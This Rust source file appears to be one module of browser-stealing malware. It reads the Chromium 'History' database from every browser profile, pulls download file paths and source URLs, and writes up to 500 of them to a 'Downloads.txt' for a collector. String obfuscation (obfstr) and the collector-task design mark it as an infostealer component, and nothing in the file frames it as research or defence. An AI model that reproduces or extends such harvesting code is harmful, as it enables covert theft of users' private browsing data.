use crate::chromium::BrowserData;
use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Download};
use alloc::borrow::ToOwned;
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

const DOWNLOADS_CURRENT_PATH: usize = 2;
const DOWNLOADS_TAB_URL: usize      = 16;

pub(super) struct DownloadsTask {
    browser: Arc<BrowserData>
}

impl DownloadsTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector> Task<C> for DownloadsTask {
    parent_name!("Downloads.txt");

    unsafe fn run(&self, parent: &Path, collector: &C) {
        let Some(mut downloads) = collect_and_read_sqlite_from_all_profiles(
            &self.browser.profiles,
            |profile| profile / s!("History"),
            s!("Downloads"),
            extract_download_from_record
        ) else {
            return
        };

        downloads.truncate(500);
        collector.browser().increase_downloads_by(downloads.len());
        let _ = to_string_and_write_all(&downloads, "\n\n", parent);
    }
}

fn extract_download_from_record(record: &dyn TableRecord) -> Option<Download> {
    let saved_as = record.get_value(DOWNLOADS_CURRENT_PATH)?.as_string()?.to_owned();
    let url = record.get_value(DOWNLOADS_TAB_URL)?.as_string()?.to_owned();

    Some(Download {
        saved_as,
        url
    })
}